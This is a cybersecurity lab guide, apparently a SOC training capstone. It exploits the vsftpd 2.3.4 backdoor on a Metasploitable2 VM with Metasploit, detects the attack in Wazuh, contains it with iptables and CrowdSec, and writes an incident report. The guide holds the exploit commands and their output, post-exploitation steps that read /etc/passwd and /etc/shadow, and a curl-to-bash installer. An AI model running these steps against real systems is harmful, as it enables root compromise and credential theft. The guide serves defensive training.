#  08 — Capstone Project: Full Alert-to-Response Cycle

> **Tools:** Metasploit · Wazuh · CrowdSec · Google Docs  
> **Goal:** Simulate a real attack, detect it in Wazuh, triage, respond, block, and write a full report.

---

##  Lab Setup

### Network Architecture


### VM Setup Requirements

```bash
# VMs needed (VirtualBox or VMware):
# 1. Wazuh Server OVA         - https://documentation.wazuh.com/
# 2. Metasploitable2 ISO      - https://sourceforge.net/projects/metasploitable/
# 3. Kali Linux ISO           - https://kali.org/get-kali/

# Configure all VMs on Host-Only Network: 192.168.56.0/24
# Kali:           192.168.56.100
# Metasploitable: 192.168.56.101
# Wazuh:          192.168.56.10

# Install Wazuh agent on Metasploitable2
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt update && sudo apt install wazuh-agent
sudo sed -i "s/MANAGER_IP/192.168.56.10/g" /var/ossec/etc/ossec.conf
sudo service wazuh-agent start
```

---

##  Phase 1: Attack Simulation (Metasploit)

### Step 1: Reconnaissance

```bash
# On Kali Linux — Discover target
nmap -sV -sC -O 192.168.56.101 -oN recon_metasploitable.txt

# Expected output (partial):
# PORT    STATE SERVICE VERSION
# 21/tcp  open  ftp     vsftpd 2.3.4        ← VULNERABLE!
# 22/tcp  open  ssh     OpenSSH 4.7p1
# 23/tcp  open  telnet  Linux telnetd
# 80/tcp  open  http    Apache httpd 2.2.8
# 3306/tcp open mysql   MySQL 5.0.51a-3ubuntu5

echo "[RECON] vsftpd 2.3.4 identified — CVE-2011-2523 — Backdoor"
```

### Step 2: Launch Metasploit

```bash
# Start Metasploit Framework
msfconsole

                                                  ___
                                              ,-""   `.
                                            ,'  _   e )`-.
                                           /  ,' `-._<.===-'
                                          /  /
                                         /  ;
        _________________________________/  /
       (_____________(  )_______________(  /
       (_____________()_____________(_)  (
                                        `\  \
                                          `\  \
                                           `\  >--,
                                             )=`  (
                                       ,==`-'     )
                                      ( `\ ,----"
                                       \ / /
                                        V /
     msf6 >
```

### Step 3: Exploit vsftpd 2.3.4 Backdoor

```bash
# In Metasploit console:

# Search for the exploit
msf6 > search vsftpd

# Output:
# Matching Modules
# ================
#   #  Name                                  Rank       Description
#   -  ----                                  ----       -----------
#   0  exploit/unix/ftp/vsftpd_234_backdoor  excellent  VSFTPD v2.3.4 Backdoor Command Execution

# Use the exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Set the target IP
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101

# Set local host (attacker IP)
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.56.100

# Run the exploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

# Expected output:
# [*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 192.168.56.101:21 - USER: 331 Please specify the password.
# [+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
# [+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
# [*] Found shell.
# [*] Command shell session 1 opened (192.168.56.100:39875 -> 192.168.56.101:6200)
```

### Step 4: Post-Exploitation Commands

```bash
# In the Metasploit shell:

# Verify root access
id
# uid=0(root) gid=0(root)

# Explore the system
whoami && hostname && ifconfig

# Create a test file to trigger FIM in Wazuh
echo "pwned by cyart-soc-test" > /tmp/CYART_TEST_$(date +%Y%m%d).txt

# Try lateral movement simulation
cat /etc/passwd | head -5
cat /etc/shadow 2>/dev/null || echo "shadow readable as root"

# Simulate data collection
ls /var/www/html/
find /home -name "*.txt" 2>/dev/null

# Exit shell
exit
```

---

##  Phase 2: Detection & Triage (Wazuh)

### Step 1: View Alerts in Wazuh Dashboard


### Step 2: Verify Alert in Wazuh CLI

```bash
# On Wazuh Server — Check alerts log
sudo grep "vsftpd\|backdoor\|6200" /var/ossec/logs/alerts/alerts.log

# Check FIM alerts for the created test file
sudo grep "CYART_TEST" /var/ossec/logs/alerts/alerts.log

# View raw JSON alert
sudo tail -f /var/ossec/logs/alerts/alerts.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        alert = json.loads(line)
        if alert.get('rule', {}).get('level', 0) >= 9:
            print(f\"Level: {alert['rule']['level']}\")
            print(f\"Rule:  {alert['rule']['description']}\")
            print(f\"Agent: {alert['agent']['name']}\")
            print(f\"Time:  {alert['timestamp']}\")
            print('─'*50)
    except:
        pass
"
```

### Step 3: Document Triage Results

```
DETECTION TRIAGE DOCUMENTATION
════════════════════════════════════════════════════════════

┌───────────────────────┬──────────────────┬────────────────────┬─────────────────┐
│ Timestamp (UTC)       │ Source IP        │ Alert Description  │ MITRE Technique │
├───────────────────────┼──────────────────┼────────────────────┼─────────────────┤
│ 2025-08-18 11:00:00  │ 192.168.56.100   │ FTP scan detected  │ T1595           │
│ 2025-08-18 11:02:00  │ 192.168.56.100   │ FTP login attempt  │ T1190           │
│ 2025-08-18 11:03:00  │ 192.168.56.100   │ VSFTPD exploit     │ T1190           │
│ 2025-08-18 11:03:15  │ 192.168.56.100   │ Root shell via 6200│ T1059           │
│ 2025-08-18 11:04:00  │ 192.168.56.100   │ New file in /tmp   │ T1074           │
└───────────────────────┴──────────────────┴────────────────────┴─────────────────┘

Attack Kill Chain:
  T1595 → Reconnaissance (nmap scan)
  T1190 → Exploit Public-Facing App (vsftpd 2.3.4)
  T1059 → Command Line Interface (root shell)
  T1074 → Data Staged (file creation in /tmp)
```

---

##  Phase 3: Response & Containment

### Step 1: Isolate the Compromised VM

```bash
# On Metasploitable2 — Block all incoming connections
sudo iptables -I INPUT -j DROP
sudo iptables -I OUTPUT -j DROP

# Exception: Keep Wazuh manager port open for logging
sudo iptables -I INPUT -s 192.168.56.10 -p tcp --dport 1514 -j ACCEPT
sudo iptables -I OUTPUT -d 192.168.56.10 -p tcp --sport 1514 -j ACCEPT

# Verify isolation
sudo iptables -L -n
```

### Step 2: Block Attacker IP with CrowdSec

```bash
# Install CrowdSec on Metasploitable2 / Wazuh server
curl -s https://install.crowdsec.net | sudo bash
sudo apt install -y crowdsec

# Add Wazuh log as CrowdSec data source
sudo cat > /etc/crowdsec/acquis.yaml << 'EOF'
filenames:
  - /var/ossec/logs/alerts/alerts.log
labels:
  type: wazuh
EOF

# Install firewall bouncer (iptables)
sudo apt install -y crowdsec-firewall-bouncer-iptables

# Manually ban the attacker IP
sudo cscli decisions add --ip 192.168.56.100 --duration 1h --reason "vsftpd exploitation"

# Verify ban
sudo cscli decisions list
```

```
Screenshot Reference — CrowdSec decisions:

│  $ sudo cscli decisions list                                   │
│                                                                │
│  ─────────────────────────────────────────────────────────     │
│  ID  │ Source   │ Scope:Value          │ Reason               │
│  ─────────────────────────────────────────────────────────     │
│  1   │ manual   │ Ip:192.168.56.100    │ vsftpd exploitation  │
│  ─────────────────────────────────────────────────────────     │
│  1 decisions                                                   │

```

### Step 3: Verify Block Works

```bash
# From Kali — Try to ping Metasploitable2 (should fail after block)
ping -c 3 192.168.56.101

# Expected output after CrowdSec ban:
# PING 192.168.56.101 (192.168.56.101): 56 data bytes
# Request timeout for icmp_seq 0
# Request timeout for icmp_seq 1
# Request timeout for icmp_seq 2
# --- 192.168.56.101 ping statistics ---
# 3 packets transmitted, 0 received, 100% packet loss

echo "✅ Attacker IP successfully blocked"
```

---

##  Phase 4: Incident Report

```
══════════════════════════════════════════════════════════════════
         CAPSTONE PROJECT — INCIDENT REPORT
         CyArt Security Operations Center — Week 2
══════════════════════════════════════════════════════════════════

Incident ID:        INC-CAPSTONE-001
Severity:           P2-High (Lab environment; production impact: P1)
CVSS Score:         10.0 (CRITICAL) — CVE-2011-2523
Date:               2025-08-18
Prepared By:        SOC Analyst — CyArt Team

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. EXECUTIVE SUMMARY
━━━━━━━━━━━━━━━━━━━━

An attacker (192.168.56.100) exploited a known backdoor in
vsftpd 2.3.4 (CVE-2011-2523) running on target server
Metasploitable2 (192.168.56.101). The exploit required no
authentication and granted an immediate root shell. Wazuh
detected the attack within 15 seconds. The host was isolated
via iptables and the attacker IP was blocked using CrowdSec.
No persistent access was established.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2. TIMELINE
━━━━━━━━━━━

11:00:00  Attacker nmap scan detected (T1595)
11:02:00  FTP connection from attacker to vsftpd
11:03:00  vsftpd backdoor triggered (CVE-2011-2523)
11:03:15  Root shell granted — WAZUH ALERT TRIGGERED
11:04:00  Test file created in /tmp by attacker
11:04:30  Wazuh FIM alert triggered (Rule 550)
11:05:00  Analyst Tier 1 notified
11:06:00  Host isolated (iptables rules applied)
11:07:00  TheHive ticket opened (CS-CAPSTONE-001)
11:08:00  Attacker IP blocked via CrowdSec
11:09:00  Ping test confirmed block successful
11:15:00  Incident report drafted

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3. ROOT CAUSE
━━━━━━━━━━━━
Running unpatched vsftpd 2.3.4 (CVE published 2011).
CVSS 10.0 — publicly available Metasploit exploit module.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4. RECOMMENDATIONS
━━━━━━━━━━━━━━━━━
  1. Update vsftpd to version 3.0.5+
  2. Disable FTP — use SFTP instead
  3. Implement network segmentation to restrict FTP access
  4. Enable vulnerability scanning (OpenVAS)
  5. Patch management: weekly automated scans
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

##  Stakeholder Briefing (Non-Technical)

```
TO:      Security Manager
FROM:    CyArt SOC Team
SUBJECT: Capstone Lab Incident — Root Access via FTP Backdoor

During our lab exercise, we simulated a real attack. An attacker
exploited an outdated FTP server (a file transfer service) with
a known vulnerability from 2011. This gave them full system
control in under 3 seconds. Our monitoring tool (Wazuh) detected
the attack immediately. We isolated the system and blocked the
attacker within 5 minutes.

Key lesson: Unpatched software is a critical risk. This type of
attack would cause complete system compromise in production.
```

---

##  Capstone Checklist

```
CAPSTONE PROJECT COMPLETION CHECKLIST
═══════════════════════════════════════

[ ] Lab environment set up (Kali + Metasploitable2 + Wazuh)
[ ] Wazuh agent installed on Metasploitable2
[ ] Nmap reconnaissance scan completed
[ ] Metasploit vsftpd exploit executed
[ ] Root shell confirmed
[ ] Post-exploitation commands run
[ ] Wazuh alert triggered and documented
[ ] Detection log table filled in
[ ] Host isolated with iptables
[ ] Attacker IP blocked with CrowdSec
[ ] Ping test confirms block works
[ ] TheHive ticket created with IOCs
[ ] Chain of custody form completed
[ ] 200-word incident report written
[ ] 100-word stakeholder briefing written
[ ] All files committed to GitHub repository
```
